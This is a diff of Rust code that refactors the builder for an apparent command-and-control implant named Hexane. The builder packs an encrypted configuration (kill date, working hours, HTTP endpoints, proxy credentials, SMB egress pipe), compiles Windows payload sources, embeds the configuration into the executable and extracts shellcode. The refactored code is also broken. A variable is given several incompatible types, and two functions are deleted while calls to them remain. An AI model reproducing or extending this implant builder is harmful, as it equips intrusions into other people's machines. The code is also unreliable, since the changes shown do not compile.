@@ -2,23 +2,28 @@ use std::env;
 use std::fs;
 use std::path::Path;
 use std::str::FromStr;
-use std::collections::HashMap;
 use rayon::prelude::*;
 use rand::Rng;
 
 use crate::rstatic::{DEBUG_FLAGS, INSTANCES, RELEASE_FLAGS, SESSION, USERAGENT};
 
 use crate::stream::Stream;
-use crate::error::{Error, Result};
 use crate::cipher::{crypt_create_key, crypt_xtea};
 use crate::binary::{copy_section_data, embed_section_data};
-use crate::types::{Builder, Compiler, Config, JsonData, Loader, Network, NetworkOptions, NetworkType, UserSession};
+use crate::types::{Builder, Compiler, Config, JsonData, Loader, Network, UserSession};
 use crate::utils::{canonical_path_all, generate_hashes, generate_object_path, normalize_path, run_command, wrap_message};
 use crate::{log_debug, log_info};
 
+use crate::error::{Error, Result};
+use crate::error::Error::Custom as Custom;
+use crate::types::NetworkType::Http as HttpType;
+use crate::types::NetworkOptions::Http as HttpOption;
+use crate::types::NetworkType::Smb as SmbType;
+use crate::types::NetworkOptions::Smb as SmbOption;
+
 pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
     if args.len() != 3 {
-        return Err(Error::Custom("invalid arguments".to_string()))
+        return Err(Custom("invalid arguments".to_string()))
     }
 
     log_info!(&"loading instance".to_string());
@@ -40,7 +45,7 @@ pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
 pub(crate) fn remove_instance(args: Vec<String>) -> Result<()> {
     // todo: remove from db
     if args.len() < 2 {
-        return Err(Error::Custom("invalid arguments".to_string()))
+        return Err(Custom("invalid arguments".to_string()))
     }
 
     let mut instances = INSTANCES.lock()?;
@@ -55,7 +60,7 @@ pub(crate) fn remove_instance(args: Vec<String>) -> Result<()> {
         Ok(())
     }
     else {
-        Err(Error::Custom("Implant not found".to_string()))
+        Err(Custom("Implant not found".to_string()))
     }
 }
 
@@ -95,7 +100,7 @@ pub struct Hexane {
     pub(crate) build_type:      u32,
     pub(crate) session_key:     Vec<u8>,
     pub(crate) shellcode:       Vec<u8>,
-    pub(crate) config_data:     Vec<u8>,
+    pub(crate) config:     Vec<u8>,
     pub(crate) active:          bool,
     pub(crate) main_cfg:        Config,
     pub(crate) builder_cfg:     Builder,
@@ -142,7 +147,7 @@ impl Hexane {
             patch = crypt_xtea(&patch_cpy, &self.session_key, true)?;
         }
 
-        self.config_data = patch;
+        self.config = patch;
         Ok(())
     }
 
@@ -153,27 +158,20 @@ impl Hexane {
             for module in modules {
                 stream.pack_string(module);
             }
-        }
-        else {
+        } else {
             log_debug!(&"no external module names found. continue.".to_owned());
         }
 
-        let working_hours = if let Some(ref hours) = self.main_cfg.working_hours {
-            i32::from_str(hours)
-                .map_err(|e|
-                    Error::Custom(format!("create_binary_patch::{e}")))?
-        }
-        else {
-            0
-        };
+        let working_hours = self.main_cfg.working_hours
+            .as_ref()
+            .map_or(Ok(0), |hours| i32::from_str(hours).map_err(|e|
+                Custom(format!("create_binary_patch:: {e}"))))?;
 
-        let kill_date = if let Some(ref date) = self.main_cfg.killdate {
-            i64::from_str(date)
-                .map_err(|e|
-                    Error::Custom(format!("create_binary_patch::{e}")))?
-        } else {
-            0
-        };
+        let kill_date = self.main_cfg.killdate
+            .as_ref()
+            .map_or(Ok(0), |date| i64::from_str(date).map_err(|e|
+                Custom(format!("create_binary_patch:: {e}"))))?;
+
 
         stream.pack_bytes(&self.session_key);
         stream.pack_string(&self.main_cfg.hostname);
@@ -184,8 +182,11 @@ impl Hexane {
         stream.pack_dword64(kill_date);
 
         if let Some(network) = self.network_cfg.as_mut() {
-            match (&network.r#type, &network.options) {
-                (NetworkType::Http, NetworkOptions::Http(ref http)) => {
+            let rtype = &network.r#type;
+            let opts = &network.options;
+
+            match (rtype, &opts) {
+                (HttpType, HttpOption(ref http)) => {
                     let useragent = http.useragent.as_ref().unwrap_or(&USERAGENT);
 
                     stream.pack_wstring(useragent);
@@ -196,25 +197,35 @@ impl Hexane {
                     for endpoint in &http.endpoints {
                         stream.pack_wstring(endpoint);
                     }
+
                     if let Some(ref domain) = http.domain {
                         stream.pack_string(domain);
                     }
+                    else {
+                        stream.pack_dword(0);
+                    }
+
                     if let Some(ref proxy) = http.proxy {
                         let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);
+
                         stream.pack_dword(1);
                         stream.pack_wstring(&proxy_url);
                         stream.pack_wstring(proxy.username.as_ref().unwrap());
                         stream.pack_wstring(proxy.password.as_ref().unwrap());
-                    } else {
+                    }
+                    else {
                         stream.pack_dword(0);
                     }
                 }
 
-                (NetworkType::Smb, NetworkOptions::Smb(ref smb)) => {
-                    stream.pack_wstring(smb.egress_pipe.as_ref().unwrap().as_str());
+                (SmbType, SmbOption(ref smb) ) => {
+                    stream.pack_wstring(smb.egress_pipe
+                        .as_ref()
+                        .unwrap()
+                        .as_str());
                 }
 
-                _ => return Err(Error::Custom("create_binary_patch: unknown network type".to_string())),
+                _ => return Err(Custom("create_binary_patch: unknown network type".to_string())),
             }
         }
 
@@ -222,45 +233,42 @@ impl Hexane {
     }
 
     pub fn compile_sources(&mut self) -> Result<()> {
-        let src_path = Path::new(
-            &self.builder_cfg.root_directory)
-            .join("src");
-
-        let output = Path::new(
-            &self.compiler_cfg.build_directory)
-            .join(&self.builder_cfg.output_name);
-
-        let entries     = canonical_path_all(src_path)?;
-        let config_data = self.config_data.clone();
+        let output      = &self.builder_cfg.output_name;
+        let root_dir    = &self.builder_cfg.root_directory;
+        let build_dir   = &self.compiler_cfg.build_directory;
 
         let includes    = self.generate_includes();
         let definitions = self.generate_definitions();
 
         let mut components  = Vec::new();
+        let src_path        = Path::new(root_dir).join("src");
+        let entries         = canonical_path_all(src_path)?;
 
         for path in entries {
-            let source      = normalize_path(path.to_str().unwrap().into());
-            let mut command = String::new();
-            let mut flags   = String::new();
+            let source = normalize_path(path
+                .to_str()
+                .unwrap()
+                .into()
+            );
 
-            let object_file = generate_object_path(&source, Path::new(&self.compiler_cfg.build_directory));
+            let object_file = generate_object_path(&source, Path::new(build_dir));
             let object = normalize_path(object_file
                 .to_str()
                 .unwrap()
                 .into()
             );
 
-            match path.extension().and_then(|ext| ext.to_str()) {
+            let mut command = String::new();
+            match path.extension()
+                .and_then(|ext| ext.to_str())
+            {
                 Some("asm") => {
                     command.push_str("nasm");
-                    flags = format!(" -f win64 {} -o {}", source, object);
-
-                    command.push_str(flags.as_str());
+                    command.push_str(format!(" -f win64 {} -o {}", source, object).as_str());
 
                     if let Err(e) = run_command(command.as_str(), "compiler_error") {
-                        return Err(Error::Custom(format!("compile_sources::{e}")));
+                        return Err(Custom(format!("compile_sources::{e}")));
                     }
-
                     components.push(object);
                 }
                 Some("cpp") => {
@@ -270,45 +278,48 @@ impl Hexane {
             }
         }
 
-        let mut buffer  = Vec::new();
+        log_info!(&"linking final objects".to_string());
 
+        let output  = Path::new(build_dir).join(output);
+        let targets = components.join(" ");
+        let flags   = &self.compiler_cfg.flags;
+
+        let mut linker = None;
         if let Some(script) = &self.builder_cfg.linker_script {
-            let path = Path::new(&self.builder_cfg.root_directory).join(script);
+            linker = Path::new(root_dir).join(script);
 
-            let linker_path = normalize_path(path
-                .to_str()
-                .unwrap()
-                .into()
-            );
-
-            buffer.push(format!(" -T {} ", linker_path.as_str()));
+            linker = normalize_path(linker.into());
+            linker = format!(" -T {} ", linker.as_str());
         }
 
-        let targets = components.join(" ");
-        let linker  = buffer.join(" ");
-
-        log_info!(&"linking final objects".to_string());
-        run_command(
-            &format!("{} {} {} {} {} {} -o {}.exe",
-                     "x86_64-w64-mingw32-g++".to_string(),
-                     includes,
-                     definitions,
-                     targets,
-                     linker,
-                     &self.compiler_cfg.flags,
-                     &output.to_str().unwrap()), "linker_error"
+        let command = format!(
+            "{} {} {} {} {} {} -o {}.exe",
+            "x86_64-w64-mingw32-g++".to_string(),
+            includes,
+            definitions,
+            targets,
+            linker,
+            flags,
+            output.to_str().unwrap()
         );
 
-        let config_size = self.main_cfg.config_size as usize;
-        if let Err(e) = embed_section_data(&format!("{}.exe", &output.to_str().unwrap()), &config_data, config_size) {
-            return Err(Error::Custom(format!("compile_sources::{e}")));
+        if let Err(e) = run_command(command, "linker_error") {
+            return Err(Custom(format!("compile_sources:: {e}")));
+        }
+
+        let config          = self.config.clone();
+        let config_size     = self.main_cfg.config_size as usize;
+        let embed_target    = output.to_str().unwrap();
+
+        if let Err(e) = embed_section_data(&format!("{}.exe", embed_target), &config, config_size) {
+            return Err(Custom(format!("compile_sources:: {e}")));
         }
 
         let mut shellcode: String = self.compiler_cfg.build_directory.to_owned();
         shellcode.push_str("/shellcode.bin");
 
-        if let Err(e) = copy_section_data(&format!("{}.exe", &output.to_str().unwrap()), shellcode.as_str(), ".text") {
-            return Err(Error::Custom(format!("compile_sources::{e}")));
+        if let Err(e) = copy_section_data(&format!("{}.exe", embed_target), shellcode.as_str(), ".text") {
+            return Err(Custom(format!("compile_sources:: {e}")));
         }
 
         // todo: extract shellcode
@@ -317,61 +328,4 @@ impl Hexane {
         Ok(())
     }
 
-    pub fn generate_definitions(&self) -> String {
-        let mut defs: HashMap<String, Option<u32>> = HashMap::new();
-
-        let config_size = self.main_cfg.config_size;
-        let encrypt     = self.main_cfg.encrypt;
-        let arch        = &self.main_cfg.architecture;
-
-        if self.main_cfg.debug {
-            defs.insert("DEBUG".to_string(), None);
-        }
-        defs.insert("CONFIG_SIZE".to_string(), Some(config_size));
-        defs.insert("ENCRYPTED".to_string(), Some(if encrypt { 1u32 } else { 0u32 }));
-        defs.insert("BSWAP".to_string(), Some(if arch == "amd64" { 0u32 } else { 1u32 }));
-
-        if let Some(network) = &self.network_cfg {
-            match network.r#type {
-                NetworkType::Http   => { defs.insert("TRANSPORT_HTTP".to_string(), None); }
-                NetworkType::Smb    => { defs.insert("TRANSPORT_PIPE".to_string(), None); }
-            }
-        }
-
-        defs.iter().map(|(name, def)| match def {
-            None        => format!(" -D{} ", name),
-            Some(value) => format!(" -D{}={} ", name, value),
-        }).collect::<String>()
-    }
-
-    pub fn generate_includes(&self) -> String {
-        let current = env::current_dir()
-            .unwrap()
-            .canonicalize()
-            .unwrap()
-            .to_str()
-            .unwrap()
-            .to_string(); // what the fuck??
-
-        let normal = normalize_path(normalize_path(current));
-
-        let mut user_include    = vec![normal.to_string()];
-        let mut includes        = vec![];
-
-
-        if let Some(include) = self.builder_cfg.include_directories.clone() {
-            let mut paths = vec![];
-
-            for path in include {
-                paths.push(normalize_path(path));
-            }
-            user_include.extend(paths);
-        }
-
-        for path in user_include.iter() {
-            includes.push(format!(" -I\"{}\" ", path))
-        }
-
-        includes.join(" ")
-    }
 }
